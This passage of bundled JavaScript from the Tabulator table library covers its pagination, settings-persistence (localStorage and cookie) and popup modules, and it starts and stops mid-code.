  userSetPageToRow(row) {
    if (this.table.options.pagination) {
      row = this.table.rowManager.findRow(row);
      if (row) {
        return this.setPageToRow(row);
      }
    }
    return Promise.reject();
  }
  userSetPageSize(size) {
    if (this.table.options.pagination) {
      this.setPageSize(size);
      return this.setPage(1);
    } else {
      return false;
    }
  }
  ///////////////////////////////////
  ///////// Internal Logic //////////
  ///////////////////////////////////
  scrollVertical(top2, dir) {
    var element, diff2, margin;
    if (!dir && !this.table.dataLoader.loading) {
      element = this.table.rowManager.getElement();
      diff2 = element.scrollHeight - element.clientHeight - top2;
      margin = this.table.options.progressiveLoadScrollMargin || element.clientHeight * 2;
      if (diff2 < margin) {
        this.nextPage().catch(() => {
        });
      }
    }
  }
  restOnRenderBefore(rows2, renderInPosition) {
    if (!renderInPosition) {
      if (this.mode === "local") {
        this.reset();
      }
    }
    return rows2;
  }
  rowsUpdated() {
    this.refreshData(true, "all");
  }
  createElements() {
    var button;
    this.element = document.createElement("span");
    this.element.classList.add("tabulator-paginator");
    this.pagesElement = document.createElement("span");
    this.pagesElement.classList.add("tabulator-pages");
    button = document.createElement("button");
    button.classList.add("tabulator-page");
    button.setAttribute("type", "button");
    button.setAttribute("role", "button");
    button.setAttribute("aria-label", "");
    button.setAttribute("title", "");
    this.firstBut = button.cloneNode(true);
    this.firstBut.setAttribute("data-page", "first");
    this.prevBut = button.cloneNode(true);
    this.prevBut.setAttribute("data-page", "prev");
    this.nextBut = button.cloneNode(true);
    this.nextBut.setAttribute("data-page", "next");
    this.lastBut = button.cloneNode(true);
    this.lastBut.setAttribute("data-page", "last");
    if (this.table.options.paginationSizeSelector) {
      this.pageSizeSelect = document.createElement("select");
      this.pageSizeSelect.classList.add("tabulator-page-size");
    }
  }
  generatePageSizeSelectList() {
    var pageSizes = [];
    if (this.pageSizeSelect) {
      if (Array.isArray(this.table.options.paginationSizeSelector)) {
        pageSizes = this.table.options.paginationSizeSelector;
        this.pageSizes = pageSizes;
        if (this.pageSizes.indexOf(this.size) == -1) {
          pageSizes.unshift(this.size);
        }
      } else {
        if (this.pageSizes.indexOf(this.size) == -1) {
          pageSizes = [];
          for (let i2 = 1; i2 < 5; i2++) {
            pageSizes.push(this.size * i2);
          }
          this.pageSizes = pageSizes;
        } else {
          pageSizes = this.pageSizes;
        }
      }
      while (this.pageSizeSelect.firstChild) this.pageSizeSelect.removeChild(this.pageSizeSelect.firstChild);
      pageSizes.forEach((item) => {
        var itemEl = document.createElement("option");
        itemEl.value = item;
        if (item === true) {
          this.langBind("pagination|all", function(value) {
            itemEl.innerHTML = value;
          });
        } else {
          itemEl.innerHTML = item;
        }
        this.pageSizeSelect.appendChild(itemEl);
      });
      this.pageSizeSelect.value = this.size;
    }
  }
  initializePageCounter() {
    var counter = this.table.options.paginationCounter, pageCounter = null;
    if (counter) {
      if (typeof counter === "function") {
        pageCounter = counter;
      } else {
        pageCounter = Page.pageCounters[counter];
      }
      if (pageCounter) {
        this.pageCounter = pageCounter;
        this.pageCounterElement = document.createElement("span");
        this.pageCounterElement.classList.add("tabulator-page-counter");
      } else {
        console.warn("Pagination Error - No such page counter found: ", counter);
      }
    }
  }
  //setup pagination
  initializePaginator(hidden) {
    var pageSelectLabel, paginationCounterHolder;
    if (!hidden) {
      this.langBind("pagination|first", (value) => {
        this.firstBut.innerHTML = value;
      });
      this.langBind("pagination|first_title", (value) => {
        this.firstBut.setAttribute("aria-label", value);
        this.firstBut.setAttribute("title", value);
      });
      this.langBind("pagination|prev", (value) => {
        this.prevBut.innerHTML = value;
      });
      this.langBind("pagination|prev_title", (value) => {
        this.prevBut.setAttribute("aria-label", value);
        this.prevBut.setAttribute("title", value);
      });
      this.langBind("pagination|next", (value) => {
        this.nextBut.innerHTML = value;
      });
      this.langBind("pagination|next_title", (value) => {
        this.nextBut.setAttribute("aria-label", value);
        this.nextBut.setAttribute("title", value);
      });
      this.langBind("pagination|last", (value) => {
        this.lastBut.innerHTML = value;
      });
      this.langBind("pagination|last_title", (value) => {
        this.lastBut.setAttribute("aria-label", value);
        this.lastBut.setAttribute("title", value);
      });
      this.firstBut.addEventListener("click", () => {
        this.setPage(1);
      });
      this.prevBut.addEventListener("click", () => {
        this.previousPage();
      });
      this.nextBut.addEventListener("click", () => {
        this.nextPage();
      });
      this.lastBut.addEventListener("click", () => {
        this.setPage(this.max);
      });
      if (this.table.options.paginationElement) {
        this.element = this.table.options.paginationElement;
      }
      if (this.pageSizeSelect) {
        pageSelectLabel = document.createElement("label");
        this.langBind("pagination|page_size", (value) => {
          this.pageSizeSelect.setAttribute("aria-label", value);
          this.pageSizeSelect.setAttribute("title", value);
          pageSelectLabel.innerHTML = value;
        });
        this.element.appendChild(pageSelectLabel);
        this.element.appendChild(this.pageSizeSelect);
        this.pageSizeSelect.addEventListener("change", (e2) => {
          this.setPageSize(this.pageSizeSelect.value == "true" ? true : this.pageSizeSelect.value);
          this.setPage(1);
        });
      }
      this.element.appendChild(this.firstBut);
      this.element.appendChild(this.prevBut);
      this.element.appendChild(this.pagesElement);
      this.element.appendChild(this.nextBut);
      this.element.appendChild(this.lastBut);
      if (!this.table.options.paginationElement) {
        if (this.table.options.paginationCounter) {
          if (this.table.options.paginationCounterElement) {
            if (this.table.options.paginationCounterElement instanceof HTMLElement) {
              this.table.options.paginationCounterElement.appendChild(this.pageCounterElement);
            } else if (typeof this.table.options.paginationCounterElement === "string") {
              paginationCounterHolder = document.querySelector(this.table.options.paginationCounterElement);
              if (paginationCounterHolder) {
                paginationCounterHolder.appendChild(this.pageCounterElement);
              } else {
                console.warn("Pagination Error - Unable to find element matching paginationCounterElement selector:", this.table.options.paginationCounterElement);
              }
            }
          } else {
            this.footerAppend(this.pageCounterElement);
          }
        }
        this.footerAppend(this.element);
      }
      this.page = this.table.options.paginationInitialPage;
      this.count = this.table.options.paginationButtonCount;
    }
    this.mode = this.table.options.paginationMode;
  }
  initializeProgressive(mode) {
    this.initializePaginator(true);
    this.mode = "progressive_" + mode;
    this.progressiveLoad = true;
  }
  trackChanges() {
    this.dispatch("page-changed");
  }
  //calculate maximum page from number of rows
  setMaxRows(rowCount) {
    if (!rowCount) {
      this.max = 1;
    } else {
      this.max = this.size === true ? 1 : Math.ceil(rowCount / this.size);
    }
    if (this.page > this.max) {
      this.page = this.max;
    }
  }
  //reset to first page without triggering action
  reset(force) {
    if (!this.initialLoad) {
      if (this.mode == "local" || force) {
        this.page = 1;
        this.trackChanges();
      }
    }
  }
  //set the maximum page
  setMaxPage(max2) {
    max2 = parseInt(max2);
    this.max = max2 || 1;
    if (this.page > this.max) {
      this.page = this.max;
      this.trigger();
    }
  }
  //set current page number
  setPage(page) {
    switch (page) {
      case "first":
        return this.setPage(1);
      case "prev":
        return this.previousPage();
      case "next":
        return this.nextPage();
      case "last":
        return this.setPage(this.max);
    }
    page = parseInt(page);
    if (page > 0 && page <= this.max || this.mode !== "local") {
      this.page = page;
      this.trackChanges();
      return this.trigger();
    } else {
      console.warn("Pagination Error - Requested page is out of range of 1 - " + this.max + ":", page);
      return Promise.reject();
    }
  }
  setPageToRow(row) {
    var rows2 = this.displayRows(-1);
    var index = rows2.indexOf(row);
    if (index > -1) {
      var page = this.size === true ? 1 : Math.ceil((index + 1) / this.size);
      return this.setPage(page);
    } else {
      console.warn("Pagination Error - Requested row is not visible");
      return Promise.reject();
    }
  }
  setPageSize(size) {
    if (size !== true) {
      size = parseInt(size);
    }
    if (size > 0) {
      this.size = size;
      this.dispatchExternal("pageSizeChanged", size);
    }
    if (this.pageSizeSelect) {
      this.generatePageSizeSelectList();
    }
    this.trackChanges();
  }
  _setPageCounter(totalRows, size, currentRow) {
    var content;
    if (this.pageCounter) {
      if (this.mode === "remote") {
        size = this.size;
        currentRow = (this.page - 1) * this.size + 1;
        totalRows = this.remoteRowCountEstimate;
      }
      content = this.pageCounter.call(this, size, currentRow, this.page, totalRows, this.max);
      switch (typeof content) {
        case "object":
          if (content instanceof Node) {
            while (this.pageCounterElement.firstChild) this.pageCounterElement.removeChild(this.pageCounterElement.firstChild);
            this.pageCounterElement.appendChild(content);
          } else {
            this.pageCounterElement.innerHTML = "";
            if (content != null) {
              console.warn("Page Counter Error - Page Counter has returned a type of object, the only valid page counter object return is an instance of Node, the page counter returned:", content);
            }
          }
          break;
        case "undefined":
          this.pageCounterElement.innerHTML = "";
          break;
        default:
          this.pageCounterElement.innerHTML = content;
      }
    }
  }
  //setup the pagination buttons
  _setPageButtons() {
    let leftSize = Math.floor((this.count - 1) / 2);
    let rightSize = Math.ceil((this.count - 1) / 2);
    let min2 = this.max - this.page + leftSize + 1 < this.count ? this.max - this.count + 1 : Math.max(this.page - leftSize, 1);
    let max2 = this.page <= rightSize ? Math.min(this.count, this.max) : Math.min(this.page + rightSize, this.max);
    while (this.pagesElement.firstChild) this.pagesElement.removeChild(this.pagesElement.firstChild);
    if (this.page == 1) {
      this.firstBut.disabled = true;
      this.prevBut.disabled = true;
    } else {
      this.firstBut.disabled = false;
      this.prevBut.disabled = false;
    }
    if (this.page == this.max) {
      this.lastBut.disabled = true;
      this.nextBut.disabled = true;
    } else {
      this.lastBut.disabled = false;
      this.nextBut.disabled = false;
    }
    for (let i2 = min2; i2 <= max2; i2++) {
      if (i2 > 0 && i2 <= this.max) {
        this.pagesElement.appendChild(this._generatePageButton(i2));
      }
    }
    this.footerRedraw();
  }
  _generatePageButton(page) {
    var button = document.createElement("button");
    button.classList.add("tabulator-page");
    if (page == this.page) {
      button.classList.add("active");
    }
    button.setAttribute("type", "button");
    button.setAttribute("role", "button");
    this.langBind("pagination|page_title", (value) => {
      button.setAttribute("aria-label", value + " " + page);
      button.setAttribute("title", value + " " + page);
    });
    button.setAttribute("data-page", page);
    button.textContent = page;
    button.addEventListener("click", (e2) => {
      this.setPage(page);
    });
    return button;
  }
  //previous page
  previousPage() {
    if (this.page > 1) {
      this.page--;
      this.trackChanges();
      return this.trigger();
    } else {
      console.warn("Pagination Error - Previous page would be less than page 1:", 0);
      return Promise.reject();
    }
  }
  //next page
  nextPage() {
    if (this.page < this.max) {
      this.page++;
      this.trackChanges();
      return this.trigger();
    } else {
      if (!this.progressiveLoad) {
        console.warn("Pagination Error - Next page would be greater than maximum page of " + this.max + ":", this.max + 1);
      }
      return Promise.reject();
    }
  }
  //return current page number
  getPage() {
    return this.page;
  }
  //return max page number
  getPageMax() {
    return this.max;
  }
  getPageSize(size) {
    return this.size;
  }
  getMode() {
    return this.mode;
  }
  //return appropriate rows for current page
  getRows(data) {
    var actualRowPageSize = 0, output, start2, end2, actualStartRow;
    var actualRows = data.filter((row) => {
      return row.type === "row";
    });
    if (this.mode == "local") {
      output = [];
      this.setMaxRows(data.length);
      if (this.size === true) {
        start2 = 0;
        end2 = data.length;
      } else {
        start2 = this.size * (this.page - 1);
        end2 = start2 + parseInt(this.size);
      }
      this._setPageButtons();
      for (let i2 = start2; i2 < end2; i2++) {
        let row = data[i2];
        if (row) {
          output.push(row);
          if (row.type === "row") {
            if (!actualStartRow) {
              actualStartRow = row;
            }
            actualRowPageSize++;
          }
        }
      }
      this._setPageCounter(actualRows.length, actualRowPageSize, actualStartRow ? actualRows.indexOf(actualStartRow) + 1 : 0);
      return output;
    } else {
      this._setPageButtons();
      this._setPageCounter(actualRows.length);
      return data.slice(0);
    }
  }
  trigger() {
    var left2;
    switch (this.mode) {
      case "local":
        left2 = this.table.rowManager.scrollLeft;
        this.refreshData();
        this.table.rowManager.scrollHorizontal(left2);
        this.dispatchExternal("pageLoaded", this.getPage());
        return Promise.resolve();
      case "remote":
        this.dataChanging = true;
        return this.reloadData(null).finally(() => {
          this.dataChanging = false;
        });
      case "progressive_load":
      case "progressive_scroll":
        return this.reloadData(null, true);
      default:
        console.warn("Pagination Error - no such pagination mode:", this.mode);
        return Promise.reject();
    }
  }
  _parseRemoteData(data) {
    var margin, paginationOutOfRange;
    if (typeof data.last_page === "undefined") {
      console.warn("Remote Pagination Error - Server response missing '" + (this.options("dataReceiveParams").last_page || "last_page") + "' property");
    }
    if (data.data) {
      this.max = parseInt(data.last_page) || 1;
      this.remoteRowCountEstimate = typeof data.last_row !== "undefined" ? data.last_row : data.last_page * this.size - (this.page == data.last_page ? this.size - data.data.length : 0);
      if (this.progressiveLoad) {
        switch (this.mode) {
          case "progressive_load":
            if (this.page == 1) {
              this.table.rowManager.setData(data.data, false, this.page == 1);
            } else {
              this.table.rowManager.addRows(data.data);
            }
            if (this.page < this.max) {
              setTimeout(() => {
                this.nextPage();
              }, this.table.options.progressiveLoadDelay);
            }
            break;
          case "progressive_scroll":
            data = this.page === 1 ? data.data : this.table.rowManager.getData().concat(data.data);
            this.table.rowManager.setData(data, this.page !== 1, this.page == 1);
            margin = this.table.options.progressiveLoadScrollMargin || this.table.rowManager.element.clientHeight * 2;
            if (this.table.rowManager.element.scrollHeight <= this.table.rowManager.element.clientHeight + margin) {
              if (this.page < this.max) {
                setTimeout(() => {
                  this.nextPage();
                });
              }
            }
            break;
        }
        return false;
      } else {
        if (this.page > this.max) {
          console.warn("Remote Pagination Error - Server returned last page value lower than the current page");
          paginationOutOfRange = this.options("paginationOutOfRange");
          if (paginationOutOfRange) {
            return this.setPage(typeof paginationOutOfRange === "function" ? paginationOutOfRange.call(this, this.page, this.max) : paginationOutOfRange);
          }
        }
        this.dispatchExternal("pageLoaded", this.getPage());
      }
    } else {
      console.warn("Remote Pagination Error - Server response missing '" + (this.options("dataReceiveParams").data || "data") + "' property");
    }
    return data.data;
  }
  //handle the footer element being redrawn
  footerRedraw() {
    var footer = this.table.footerManager.containerElement;
    if (Math.ceil(footer.clientWidth) - footer.scrollWidth < 0) {
      this.pagesElement.style.display = "none";
    } else {
      this.pagesElement.style.display = "";
      if (Math.ceil(footer.clientWidth) - footer.scrollWidth < 0) {
        this.pagesElement.style.display = "none";
      }
    }
  }
}
var defaultReaders = {
  local: function(id, type) {
    var data = localStorage.getItem(id + "-" + type);
    return data ? JSON.parse(data) : false;
  },
  cookie: function(id, type) {
    var cookie = document.cookie, key = id + "-" + type, cookiePos = cookie.indexOf(key + "="), end2, data;
    if (cookiePos > -1) {
      cookie = cookie.slice(cookiePos);
      end2 = cookie.indexOf(";");
      if (end2 > -1) {
        cookie = cookie.slice(0, end2);
      }
      data = cookie.replace(key + "=", "");
    }
    return data ? JSON.parse(data) : false;
  }
};
var defaultWriters = {
  local: function(id, type, data) {
    localStorage.setItem(id + "-" + type, JSON.stringify(data));
  },
  cookie: function(id, type, data) {
    var expireDate = /* @__PURE__ */ new Date();
    expireDate.setDate(expireDate.getDate() + 1e4);
    document.cookie = id + "-" + type + "=" + JSON.stringify(data) + "; expires=" + expireDate.toUTCString();
  }
};
class Persistence extends Module {
  static moduleName = "persistence";
  static moduleInitOrder = -10;
  //load defaults
  static readers = defaultReaders;
  static writers = defaultWriters;
  constructor(table) {
    super(table);
    this.mode = "";
    this.id = "";
    this.defWatcherBlock = false;
    this.config = {};
    this.readFunc = false;
    this.writeFunc = false;
    this.registerTableOption("persistence", false);
    this.registerTableOption("persistenceID", "");
    this.registerTableOption("persistenceMode", true);
    this.registerTableOption("persistenceReaderFunc", false);
    this.registerTableOption("persistenceWriterFunc", false);
  }
  // Test for whether localStorage is available for use.
  localStorageTest() {
    var testKey = "_tabulator_test";
    try {
      window.localStorage.setItem(testKey, testKey);
      window.localStorage.removeItem(testKey);
      return true;
    } catch (e2) {
      return false;
    }
  }
  //setup parameters
  initialize() {
    if (this.table.options.persistence) {
      var mode = this.table.options.persistenceMode, id = this.table.options.persistenceID, retrievedData;
      this.mode = mode !== true ? mode : this.localStorageTest() ? "local" : "cookie";
      if (this.table.options.persistenceReaderFunc) {
        if (typeof this.table.options.persistenceReaderFunc === "function") {
          this.readFunc = this.table.options.persistenceReaderFunc;
        } else {
          if (Persistence.readers[this.table.options.persistenceReaderFunc]) {
            this.readFunc = Persistence.readers[this.table.options.persistenceReaderFunc];
          } else {
            console.warn("Persistence Read Error - invalid reader set", this.table.options.persistenceReaderFunc);
          }
        }
      } else {
        if (Persistence.readers[this.mode]) {
          this.readFunc = Persistence.readers[this.mode];
        } else {
          console.warn("Persistence Read Error - invalid reader set", this.mode);
        }
      }
      if (this.table.options.persistenceWriterFunc) {
        if (typeof this.table.options.persistenceWriterFunc === "function") {
          this.writeFunc = this.table.options.persistenceWriterFunc;
        } else {
          if (Persistence.writers[this.table.options.persistenceWriterFunc]) {
            this.writeFunc = Persistence.writers[this.table.options.persistenceWriterFunc];
          } else {
            console.warn("Persistence Write Error - invalid reader set", this.table.options.persistenceWriterFunc);
          }
        }
      } else {
        if (Persistence.writers[this.mode]) {
          this.writeFunc = Persistence.writers[this.mode];
        } else {
          console.warn("Persistence Write Error - invalid writer set", this.mode);
        }
      }
      this.id = "tabulator-" + (id || (this.table.element.getAttribute("id") || ""));
      this.config = {
        sort: this.table.options.persistence === true || this.table.options.persistence.sort,
        filter: this.table.options.persistence === true || this.table.options.persistence.filter,
        headerFilter: this.table.options.persistence === true || this.table.options.persistence.headerFilter,
        group: this.table.options.persistence === true || this.table.options.persistence.group,
        page: this.table.options.persistence === true || this.table.options.persistence.page,
        columns: this.table.options.persistence === true ? ["title", "width", "visible"] : this.table.options.persistence.columns
      };
      if (this.config.page) {
        retrievedData = this.retrieveData("page");
        if (retrievedData) {
          if (typeof retrievedData.paginationSize !== "undefined" && (this.config.page === true || this.config.page.size)) {
            this.table.options.paginationSize = retrievedData.paginationSize;
          }
          if (typeof retrievedData.paginationInitialPage !== "undefined" && (this.config.page === true || this.config.page.page)) {
            this.table.options.paginationInitialPage = retrievedData.paginationInitialPage;
          }
        }
      }
      if (this.config.group) {
        retrievedData = this.retrieveData("group");
        if (retrievedData) {
          if (typeof retrievedData.groupBy !== "undefined" && (this.config.group === true || this.config.group.groupBy)) {
            this.table.options.groupBy = retrievedData.groupBy;
          }
          if (typeof retrievedData.groupStartOpen !== "undefined" && (this.config.group === true || this.config.group.groupStartOpen)) {
            this.table.options.groupStartOpen = retrievedData.groupStartOpen;
          }
          if (typeof retrievedData.groupHeader !== "undefined" && (this.config.group === true || this.config.group.groupHeader)) {
            this.table.options.groupHeader = retrievedData.groupHeader;
          }
        }
      }
      if (this.config.columns) {
        this.table.options.columns = this.load("columns", this.table.options.columns);
        this.subscribe("column-init", this.initializeColumn.bind(this));
        this.subscribe("column-show", this.save.bind(this, "columns"));
        this.subscribe("column-hide", this.save.bind(this, "columns"));
        this.subscribe("column-moved", this.save.bind(this, "columns"));
      }
      this.subscribe("table-built", this.tableBuilt.bind(this), 0);
      this.subscribe("table-redraw", this.tableRedraw.bind(this));
      this.subscribe("filter-changed", this.eventSave.bind(this, "filter"));
      this.subscribe("filter-changed", this.eventSave.bind(this, "headerFilter"));
      this.subscribe("sort-changed", this.eventSave.bind(this, "sort"));
      this.subscribe("group-changed", this.eventSave.bind(this, "group"));
      this.subscribe("page-changed", this.eventSave.bind(this, "page"));
      this.subscribe("column-resized", this.eventSave.bind(this, "columns"));
      this.subscribe("column-width", this.eventSave.bind(this, "columns"));
      this.subscribe("layout-refreshed", this.eventSave.bind(this, "columns"));
    }
    this.registerTableFunction("getColumnLayout", this.getColumnLayout.bind(this));
    this.registerTableFunction("setColumnLayout", this.setColumnLayout.bind(this));
  }
  eventSave(type) {
    if (this.config[type]) {
      this.save(type);
    }
  }
  tableBuilt() {
    var sorters, filters, headerFilters;
    if (this.config.sort) {
      sorters = this.load("sort");
      if (!sorters === false) {
        this.table.options.initialSort = sorters;
      }
    }
    if (this.config.filter) {
      filters = this.load("filter");
      if (!filters === false) {
        this.table.options.initialFilter = filters;
      }
    }
    if (this.config.headerFilter) {
      headerFilters = this.load("headerFilter");
      if (!headerFilters === false) {
        this.table.options.initialHeaderFilter = headerFilters;
      }
    }
  }
  tableRedraw(force) {
    if (force && this.config.columns) {
      this.save("columns");
    }
  }
  ///////////////////////////////////
  ///////// Table Functions /////////
  ///////////////////////////////////
  getColumnLayout() {
    return this.parseColumns(this.table.columnManager.getColumns());
  }
  setColumnLayout(layout) {
    this.table.columnManager.setColumns(this.mergeDefinition(this.table.options.columns, layout, true));
    return true;
  }
  ///////////////////////////////////
  ///////// Internal Logic //////////
  ///////////////////////////////////
  initializeColumn(column) {
    var def, keys;
    if (this.config.columns) {
      this.defWatcherBlock = true;
      def = column.getDefinition();
      keys = this.config.columns === true ? Object.keys(def) : this.config.columns;
      keys.forEach((key) => {
        var props = Object.getOwnPropertyDescriptor(def, key);
        var value = def[key];
        if (props) {
          Object.defineProperty(def, key, {
            set: (newValue) => {
              value = newValue;
              if (!this.defWatcherBlock) {
                this.save("columns");
              }
              if (props.set) {
                props.set(newValue);
              }
            },
            get: () => {
              if (props.get) {
                props.get();
              }
              return value;
            }
          });
        }
      });
      this.defWatcherBlock = false;
    }
  }
  //load saved definitions
  load(type, current) {
    var data = this.retrieveData(type);
    if (current) {
      data = data ? this.mergeDefinition(current, data) : current;
    }
    return data;
  }
  //retrieve data from memory
  retrieveData(type) {
    return this.readFunc ? this.readFunc(this.id, type) : false;
  }
  //merge old and new column definitions
  mergeDefinition(oldCols, newCols, mergeAllNew) {
    var output = [];
    newCols = newCols || [];
    newCols.forEach((column, to) => {
      var from = this._findColumn(oldCols, column), keys;
      if (from) {
        if (mergeAllNew) {
          keys = Object.keys(column);
        } else if (this.config.columns === true || this.config.columns == void 0) {
          keys = Object.keys(from);
          keys.push("width");
        } else {
          keys = this.config.columns;
        }
        keys.forEach((key) => {
          if (key !== "columns" && typeof column[key] !== "undefined") {
            from[key] = column[key];
          }
        });
        if (from.columns) {
          from.columns = this.mergeDefinition(from.columns, column.columns);
        }
        output.push(from);
      }
    });
    oldCols.forEach((column, i2) => {
      var from = this._findColumn(newCols, column);
      if (!from) {
        if (output.length > i2) {
          output.splice(i2, 0, column);
        } else {
          output.push(column);
        }
      }
    });
    return output;
  }
  //find matching columns
  _findColumn(columns, subject) {
    var type = subject.columns ? "group" : subject.field ? "field" : "object";
    return columns.find(function(col) {
      switch (type) {
        case "group":
          return col.title === subject.title && col.columns.length === subject.columns.length;
        case "field":
          return col.field === subject.field;
        case "object":
          return col === subject;
      }
    });
  }
  //save data
  save(type) {
    var data = {};
    switch (type) {
      case "columns":
        data = this.parseColumns(this.table.columnManager.getColumns());
        break;
      case "filter":
        data = this.table.modules.filter.getFilters();
        break;
      case "headerFilter":
        data = this.table.modules.filter.getHeaderFilters();
        break;
      case "sort":
        data = this.validateSorters(this.table.modules.sort.getSort());
        break;
      case "group":
        data = this.getGroupConfig();
        break;
      case "page":
        data = this.getPageConfig();
        break;
    }
    if (this.writeFunc) {
      this.writeFunc(this.id, type, data);
    }
  }
  //ensure sorters contain no function data
  validateSorters(data) {
    data.forEach(function(item) {
      item.column = item.field;
      delete item.field;
    });
    return data;
  }
  getGroupConfig() {
    var data = {};
    if (this.config.group) {
      if (this.config.group === true || this.config.group.groupBy) {
        data.groupBy = this.table.options.groupBy;
      }
      if (this.config.group === true || this.config.group.groupStartOpen) {
        data.groupStartOpen = this.table.options.groupStartOpen;
      }
      if (this.config.group === true || this.config.group.groupHeader) {
        data.groupHeader = this.table.options.groupHeader;
      }
    }
    return data;
  }
  getPageConfig() {
    var data = {};
    if (this.config.page) {
      if (this.config.page === true || this.config.page.size) {
        data.paginationSize = this.table.modules.page.getPageSize();
      }
      if (this.config.page === true || this.config.page.page) {
        data.paginationInitialPage = this.table.modules.page.getPage();
      }
    }
    return data;
  }
  //parse columns for data to store
  parseColumns(columns) {
    var definitions = [], excludedKeys = ["headerContextMenu", "headerMenu", "contextMenu", "clickMenu"];
    columns.forEach((column) => {
      var defStore = {}, colDef = column.getDefinition(), keys;
      if (column.isGroup) {
        defStore.title = colDef.title;
        defStore.columns = this.parseColumns(column.getColumns());
      } else {
        defStore.field = column.getField();
        if (this.config.columns === true || this.config.columns == void 0) {
          keys = Object.keys(colDef);
          keys.push("width");
          keys.push("visible");
        } else {
          keys = this.config.columns;
        }
        keys.forEach((key) => {
          switch (key) {
            case "width":
              defStore.width = column.getWidth();
              break;
            case "visible":
              defStore.visible = column.visible;
              break;
            default:
              if (typeof colDef[key] !== "function" && excludedKeys.indexOf(key) === -1) {
                defStore[key] = colDef[key];
              }
          }
        });
      }
      definitions.push(defStore);
    });
    return definitions;
  }
}
class Popup2 extends Module {
  static moduleName = "popup";
  constructor(table) {
    super(table);
    this.columnSubscribers = {};
    this.registerTableOption("rowContextPopup", false);
    this.registerTableOption("rowClickPopup", false);
    this.registerTableOption("rowDblClickPopup", false);
    this.registerTableOption("groupContextPopup", false);
    this.registerTableOption("groupClickPopup", false);
    this.registerTableOption("groupDblClickPopup", false);
    this.registerColumnOption("headerContextPopup");
    this.registerColumnOption("headerClickPopup");
    this.registerColumnOption("headerDblClickPopup");
    this.registerColumnOption("headerPopup");
    this.registerColumnOption("headerPopupIcon");
    this.registerColumnOption("contextPopup");
    this.registerColumnOption("clickPopup");
    this.registerColumnOption("dblClickPopup");
    this.registerComponentFunction("cell", "popup", this._componentPopupCall.bind(this));
    this.registerComponentFunction("column", "popup", this._componentPopupCall.bind(this));
    this.registerComponentFunction("row", "popup", this._componentPopupCall.bind(this));
    this.registerComponentFunction("group", "popup", this._componentPopupCall.bind(this));
  }
  initialize() {
    this.initializeRowWatchers();
    this.initializeGroupWatchers();
    this.subscribe("column-init", this.initializeColumn.bind(this));
  }
  _componentPopupCall(component, contents, position) {
    this.loadPopupEvent(contents, null, component, position);
  }
  initializeRowWatchers() {
    if (this.table.options.rowContextPopup) {
      this.subscribe("row-contextmenu", this.loadPopupEvent.bind(this, this.table.options.rowContextPopup));
      this.table.on("rowTapHold", this.loadPopupEvent.bind(this, this.table.options.rowContextPopup));
    }
    if (this.table.options.rowClickPopup) {
      this.subscribe("row-click", this.loadPopupEvent.bind(this, this.table.options.rowClickPopup));
    }
    if (this.table.options.rowDblClickPopup) {
      this.subscribe("row-dblclick", this.loadPopupEvent.bind(this, this.table.options.rowDblClickPopup));
    }
  }
  initializeGroupWatchers() {
    if (this.table.options.groupContextPopup) {
      this.subscribe("group-contextmenu", this.loadPopupEvent.bind(this, this.table.options.groupContextPopup));
      this.table.on("groupTapHold", this.loadPopupEvent.bind(this, this.table.options.groupContextPopup));
    }
    if (this.table.options.groupClickPopup) {
      this.subscribe("group-click", this.loadPopupEvent.bind(this, this.table.options.groupClickPopup));
    }
    if (this.table.options.groupDblClickPopup) {
      this.subscribe("group-dblclick", this.loadPopupEvent.bind(this, this.table.options.groupDblClickPopup));
    }
  }
  initializeColumn(column) {
    var def = column.definition;
    if (def.headerContextPopup && !this.columnSubscribers.headerContextPopup) {
      this.columnSubscribers.headerContextPopup = this.loadPopupTableColumnEvent.bind(this, "headerContextPopup");
      this.subscribe("column-contextmenu", this.columnSubscribers.headerContextPopup);
      this.table.on("headerTapHold", this.loadPopupTableColumnEvent.bind(this, "headerContextPopup"));
    }
    if (def.headerClickPopup && !this.columnSubscribers.headerClickPopup) {
      this.columnSubscribers.headerClickPopup = this.loadPopupTableColumnEvent.bind(this, "headerClickPopup");
      this.subscribe("column-click", this.columnSubscribers.headerClickPopup);
    }
    if (def.headerDblClickPopup && !this.columnSubscribers.headerDblClickPopup) {
      this.columnSubscribers.headerDblClickPopup = this.loadPopupTableColumnEvent.bind(this, "headerDblClickPopup");
      this.subscribe("column-dblclick", this.columnSubscribers.headerDblClickPopup);
    }
    if (def.headerPopup) {
      this.initializeColumnHeaderPopup(column);
    }
    if (def.contextPopup && !this.columnSubscribers.contextPopup) {
      this.columnSubscribers.contextPopup = this.loadPopupTableCellEvent.bind(this, "contextPopup");
      this.subscribe("cell-contextmenu", this.columnSubscribers.contextPopup);
      this.table.on("cellTapHold", this.loadPopupTableCellEvent.bind(this, "contextPopup"));
    }
    if (def.clickPopup && !this.columnSubscribers.clickPopup) {
      this.columnSubscribers.clickPopup = this.loadPopupTableCellEvent.bind(this, "clickPopup");
      this.subscribe("cell-click", this.columnSubscribers.clickPopup);
    }
    if (def.dblClickPopup && !this.columnSubscribers.dblClickPopup) {
      this.columnSubscribers.dblClickPopup = this.loadPopupTableCellEvent.bind(this, "dblClickPopup");
      this.subscribe("cell-click", this.columnSubscribers.dblClickPopup);
    }
  }
  initializeColumnHeaderPopup(column) {
    var icon = column.definition.headerPopupIcon, headerPopupEl;
    headerPopupEl = document.createElement("span");
    headerPopupEl.classList.add("tabulator-header-popup-button");
    if (icon) {
      if (typeof icon === "function") {
        icon = icon(column.getComponent());
      }
      if (icon instanceof HTMLElement) {
        headerPopupEl.appendChild(icon);
      } else {
        headerPopupEl.innerHTML = icon;
      }
    } else {
      headerPopupEl.innerHTML = "&vellip;";
    }
    headerPopupEl.addEventListener("click", (e2) => {
      e2.stopPropagation();
      e2.preventDefault();
      this.loadPopupEvent(column.definition.headerPopup, e2, column);
    });
    column.titleElement.insertBefore(headerPopupEl, column.titleElement.firstChild);
  }
  loadPopupTableCellEvent(option, e2, cell) {
    if (cell._cell) {
      cell = cell._cell;
    }
    if (cell.column.definition[option]) {
      this.loadPopupEvent(cell.column.definition[option], e2, cell);
    }
  }
  loadPopupTableColumnEvent(option, e2, column) {
    if (column._column) {
      column = column._column;
    }
    if (column.definition[option]) {
      this.loadPopupEvent(column.definition[option], e2, column);
    }
  }
  loadPopupEvent(contents, e2, component, position) {
    var renderedCallback;
    function onRendered(callback) {
      renderedCallback = callback;
    }
    if (component._group) {
      component = component._group;
    } else if (component._row) {
      component = component._row;
    }
    contents = typeof contents == "function" ? contents.call(this.table, e2, component.getComponent(), onRendered) : contents;
    this.loadPopup(e2, component, contents, renderedCallback, position);
  }
  loadPopup(e2, component, contents, renderedCallback, position) {
